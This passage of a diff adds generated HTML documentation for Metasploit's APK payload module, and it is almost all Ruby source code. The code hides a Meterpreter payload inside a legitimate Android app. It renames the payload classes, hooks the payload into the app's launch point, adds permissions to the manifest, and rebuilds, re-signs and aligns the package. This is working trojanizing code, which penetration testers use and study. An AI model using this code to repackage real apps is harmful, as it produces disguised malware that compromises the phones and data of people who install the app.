+  <span class='id identifier rubyid_classes'>classes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MainService</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='op'>::</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>5</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_capitalize'>capitalize</span>
+  <span class='id identifier rubyid_classes'>classes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MainBroadcastReceiver</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='op'>::</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>5</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_capitalize'>capitalize</span>
+  <span class='id identifier rubyid_package_slash'>package_slash</span> <span class='op'>=</span> <span class='id identifier rubyid_package'>package</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>\.</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Adding payload as package </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_package'>package</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_payload_files'>payload_files</span> <span class='op'>=</span> <span class='const'>Dir</span><span class='period'>.</span><span class='id identifier rubyid_glob'>glob</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/payload/smali/com/metasploit/stage/*.smali</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_payload_dir'>payload_dir</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original/smali/</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_package_slash'>package_slash</span><span class='embexpr_end'>}</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span>
+  <span class='const'>FileUtils</span><span class='period'>.</span><span class='id identifier rubyid_mkdir_p'>mkdir_p</span> <span class='id identifier rubyid_payload_dir'>payload_dir</span>
+
+  <span class='comment'># Copy over the payload files, fixing up the smali code
+</span>  <span class='id identifier rubyid_payload_files'>payload_files</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_file_name'>file_name</span><span class='op'>|</span>
+    <span class='id identifier rubyid_smali'>smali</span> <span class='op'>=</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span><span class='lparen'>(</span><span class='id identifier rubyid_file_name'>file_name</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_smali_class'>smali_class</span> <span class='op'>=</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_basename'>basename</span> <span class='id identifier rubyid_file_name'>file_name</span>
+    <span class='kw'>for</span> <span class='id identifier rubyid_oldclass'>oldclass</span><span class='comma'>,</span> <span class='id identifier rubyid_newclass'>newclass</span> <span class='kw'>in</span> <span class='id identifier rubyid_classes'>classes</span>
+      <span class='kw'>if</span> <span class='id identifier rubyid_smali_class'>smali_class</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_oldclass'>oldclass</span><span class='embexpr_end'>}</span><span class='tstring_content'>.smali</span><span class='tstring_end'>&quot;</span></span>
+        <span class='id identifier rubyid_smali_class'>smali_class</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_newclass'>newclass</span><span class='embexpr_end'>}</span><span class='tstring_content'>.smali</span><span class='tstring_end'>&quot;</span></span>
+      <span class='kw'>end</span>
+      <span class='id identifier rubyid_smali'>smali</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>com\/metasploit\/stage\/</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_oldclass'>oldclass</span><span class='embexpr_end'>}</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='id identifier rubyid_package_slash'>package_slash</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_newclass'>newclass</span><span class='rparen'>)</span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_smali'>smali</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>com\/metasploit\/stage</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='id identifier rubyid_package_slash'>package_slash</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_newfilename'>newfilename</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payload_dir'>payload_dir</span><span class='embexpr_end'>}</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_smali_class'>smali_class</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+    <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_open'>open</span><span class='lparen'>(</span><span class='id identifier rubyid_newfilename'>newfilename</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>wb</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='lbrace'>{</span><span class='op'>|</span><span class='id identifier rubyid_file'>file</span><span class='op'>|</span> <span class='id identifier rubyid_file'>file</span><span class='period'>.</span><span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_smali'>smali</span> <span class='rbrace'>}</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_service'>service</span>
+    <span class='id identifier rubyid_hookfunction'>hookfunction</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>L</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_package_slash'>package_slash</span><span class='embexpr_end'>}</span><span class='tstring_content'>/</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_classes'>classes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MainService</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>;-&gt;start()V</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_hookfunction'>hookfunction</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>L</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_package_slash'>package_slash</span><span class='embexpr_end'>}</span><span class='tstring_content'>/</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_classes'>classes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>;-&gt;startContext()V</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_payloadhook'>payloadhook</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>invoke-static {}, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_hookfunction'>hookfunction</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  </span><span class='tstring_end'>^</span></span> <span class='op'>+</span> <span class='id identifier rubyid_entrypoint'>entrypoint</span>
+  <span class='id identifier rubyid_hookedsmali'>hookedsmali</span> <span class='op'>=</span> <span class='id identifier rubyid_hooksmali'>hooksmali</span><span class='period'>.</span><span class='id identifier rubyid_sub'>sub</span><span class='lparen'>(</span><span class='id identifier rubyid_entrypoint'>entrypoint</span><span class='comma'>,</span> <span class='id identifier rubyid_payloadhook'>payloadhook</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Loading </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_smalifile'>smalifile</span><span class='embexpr_end'>}</span><span class='tstring_content'> and injecting payload..\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_open'>open</span><span class='lparen'>(</span><span class='id identifier rubyid_smalifile'>smalifile</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>wb</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='lbrace'>{</span><span class='op'>|</span><span class='id identifier rubyid_file'>file</span><span class='op'>|</span> <span class='id identifier rubyid_file'>file</span><span class='period'>.</span><span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_hookedsmali'>hookedsmali</span> <span class='rbrace'>}</span>
+
+  <span class='id identifier rubyid_injected_apk'>injected_apk</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/output.apk</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_aligned_apk'>aligned_apk</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/aligned.apk</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_manifest'>manifest</span>
+    <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Poisoning the manifest with meterpreter permissions..\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_fix_manifest'>fix_manifest</span><span class='lparen'>(</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='comma'>,</span> <span class='id identifier rubyid_package'>package</span><span class='comma'>,</span> <span class='id identifier rubyid_classes'>classes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MainService</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span> <span class='id identifier rubyid_classes'>classes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MainBroadcastReceiver</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Rebuilding apk with meterpreter injection as </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_injected_apk'>injected_apk</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_apktool_output'>apktool_output</span> <span class='op'>=</span> <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>apktool</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>b</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-o</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_injected_apk'>injected_apk</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original</span><span class='tstring_end'>&quot;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='kw'>unless</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_readable?'>readable?</span><span class='lparen'>(</span><span class='id identifier rubyid_injected_apk'>injected_apk</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_print_error'><span class='object_link'><a href="../../top-level-namespace.html#print_error-instance_method" title="#print_error (method)">print_error</a></span></span> <span class='id identifier rubyid_apktool_output'>apktool_output</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unable to rebuild apk with apktool</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_signature'>signature</span>
+    <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Signing </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_injected_apk'>injected_apk</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span>
+      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>jarsigner</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-sigalg</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHA1withRSA</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-digestalg</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHA1</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-keystore</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_keystore'>keystore</span><span class='comma'>,</span>
+      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-storepass</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_storepass'>storepass</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-keypass</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_keypass'>keypass</span><span class='comma'>,</span> <span class='id identifier rubyid_injected_apk'>injected_apk</span><span class='comma'>,</span> <span class='id identifier rubyid_keyalias'>keyalias</span>
+    <span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Aligning </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_injected_apk'>injected_apk</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>zipalign</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>4</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_injected_apk'>injected_apk</span><span class='comma'>,</span> <span class='id identifier rubyid_aligned_apk'>aligned_apk</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_aligned_apk'>aligned_apk</span> <span class='op'>=</span> <span class='id identifier rubyid_injected_apk'>injected_apk</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_outputapk'>outputapk</span> <span class='op'>=</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span><span class='lparen'>(</span><span class='id identifier rubyid_aligned_apk'>aligned_apk</span><span class='rparen'>)</span>
+
+  <span class='const'>FileUtils</span><span class='period'>.</span><span class='id identifier rubyid_remove_entry'>remove_entry</span> <span class='id identifier rubyid_tempdir'>tempdir</span>
+  <span class='id identifier rubyid_outputapk'>outputapk</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="find_hook_point-instance_method">
+  
+    #<strong>find_hook_point</strong>(amanifest)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Find a suitable smali point to hook</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 38</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_find_hook_point'>find_hook_point</span><span class='lparen'>(</span><span class='id identifier rubyid_amanifest'>amanifest</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_package'>package</span> <span class='op'>=</span> <span class='id identifier rubyid_amanifest'>amanifest</span><span class='period'>.</span><span class='id identifier rubyid_xpath'>xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>//manifest</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_first'>first</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>package</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_application'>application</span> <span class='op'>=</span> <span class='id identifier rubyid_amanifest'>amanifest</span><span class='period'>.</span><span class='id identifier rubyid_xpath'>xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>//application</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_application_name'>application_name</span> <span class='op'>=</span> <span class='id identifier rubyid_application'>application</span><span class='period'>.</span><span class='id identifier rubyid_attribute'>attribute</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>name</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_application_name'>application_name</span>
+    <span class='id identifier rubyid_application_str'>application_str</span> <span class='op'>=</span> <span class='id identifier rubyid_application_name'>application_name</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_application_str'>application_str</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>android.app.Application</span><span class='tstring_end'>&#39;</span></span>
+      <span class='kw'>return</span> <span class='id identifier rubyid_application_str'>application_str</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_activities'>activities</span> <span class='op'>=</span> <span class='id identifier rubyid_amanifest'>amanifest</span><span class='period'>.</span><span class='id identifier rubyid_xpath'>xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>//activity|//activity-alias</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>for</span> <span class='id identifier rubyid_activity'>activity</span> <span class='kw'>in</span> <span class='id identifier rubyid_activities'>activities</span>
+    <span class='id identifier rubyid_activityname'>activityname</span> <span class='op'>=</span> <span class='id identifier rubyid_activity'>activity</span><span class='period'>.</span><span class='id identifier rubyid_attribute'>attribute</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>targetActivity</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_activityname'>activityname</span>
+      <span class='id identifier rubyid_activityname'>activityname</span> <span class='op'>=</span> <span class='id identifier rubyid_activity'>activity</span><span class='period'>.</span><span class='id identifier rubyid_attribute'>attribute</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>name</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_category'>category</span> <span class='op'>=</span> <span class='id identifier rubyid_activity'>activity</span><span class='period'>.</span><span class='id identifier rubyid_search'>search</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>category</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_category'>category</span>
+      <span class='kw'>next</span>
+    <span class='kw'>end</span>
+    <span class='kw'>for</span> <span class='id identifier rubyid_cat'>cat</span> <span class='kw'>in</span> <span class='id identifier rubyid_category'>category</span>
+      <span class='id identifier rubyid_categoryname'>categoryname</span> <span class='op'>=</span> <span class='id identifier rubyid_cat'>cat</span><span class='period'>.</span><span class='id identifier rubyid_attribute'>attribute</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>name</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+      <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_categoryname'>categoryname</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>android.intent.category.LAUNCHER</span><span class='tstring_end'>&#39;</span></span> <span class='op'>||</span> <span class='id identifier rubyid_categoryname'>categoryname</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>android.intent.action.MAIN</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+        <span class='id identifier rubyid_name'>name</span> <span class='op'>=</span> <span class='id identifier rubyid_activityname'>activityname</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span>
+        <span class='kw'>if</span> <span class='id identifier rubyid_name'>name</span><span class='period'>.</span><span class='id identifier rubyid_start_with?'>start_with?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+          <span class='id identifier rubyid_name'>name</span> <span class='op'>=</span> <span class='id identifier rubyid_package'>package</span> <span class='op'>+</span> <span class='id identifier rubyid_name'>name</span>
+        <span class='kw'>end</span>
+        <span class='kw'>return</span> <span class='id identifier rubyid_name'>name</span>
+      <span class='kw'>end</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="fix_manifest-instance_method">
+  
+    #<strong>fix_manifest</strong>(tempdir, package, main_service, main_broadcast_receiver)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 78</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_fix_manifest'>fix_manifest</span><span class='lparen'>(</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='comma'>,</span> <span class='id identifier rubyid_package'>package</span><span class='comma'>,</span> <span class='id identifier rubyid_main_service'>main_service</span><span class='comma'>,</span> <span class='id identifier rubyid_main_broadcast_receiver'>main_broadcast_receiver</span><span class='rparen'>)</span>
+  <span class='comment'>#Load payload&#39;s manifest
+</span>  <span class='id identifier rubyid_payload_manifest'>payload_manifest</span> <span class='op'>=</span> <span class='id identifier rubyid_parse_manifest'>parse_manifest</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/payload/AndroidManifest.xml</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_payload_permissions'>payload_permissions</span> <span class='op'>=</span> <span class='id identifier rubyid_payload_manifest'>payload_manifest</span><span class='period'>.</span><span class='id identifier rubyid_xpath'>xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>//manifest/uses-permission</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='comment'>#Load original apk&#39;s manifest
+</span>  <span class='id identifier rubyid_original_manifest'>original_manifest</span> <span class='op'>=</span> <span class='id identifier rubyid_parse_manifest'>parse_manifest</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original/AndroidManifest.xml</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_original_permissions'>original_permissions</span> <span class='op'>=</span> <span class='id identifier rubyid_original_manifest'>original_manifest</span><span class='period'>.</span><span class='id identifier rubyid_xpath'>xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>//manifest/uses-permission</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_old_permissions'>old_permissions</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_add_permissions'>add_permissions</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+
+  <span class='id identifier rubyid_original_permissions'>original_permissions</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_permission'>permission</span><span class='op'>|</span>
+    <span class='id identifier rubyid_name'>name</span> <span class='op'>=</span> <span class='id identifier rubyid_permission'>permission</span><span class='period'>.</span><span class='id identifier rubyid_attribute'>attribute</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>name</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span>
+    <span class='id identifier rubyid_old_permissions'>old_permissions</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_name'>name</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_application'>application</span> <span class='op'>=</span> <span class='id identifier rubyid_original_manifest'>original_manifest</span><span class='period'>.</span><span class='id identifier rubyid_xpath'>xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>//manifest/application</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_payload_permissions'>payload_permissions</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_permission'>permission</span><span class='op'>|</span>
+    <span class='id identifier rubyid_name'>name</span> <span class='op'>=</span> <span class='id identifier rubyid_permission'>permission</span><span class='period'>.</span><span class='id identifier rubyid_attribute'>attribute</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>name</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_old_permissions'>old_permissions</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='id identifier rubyid_name'>name</span><span class='rparen'>)</span>
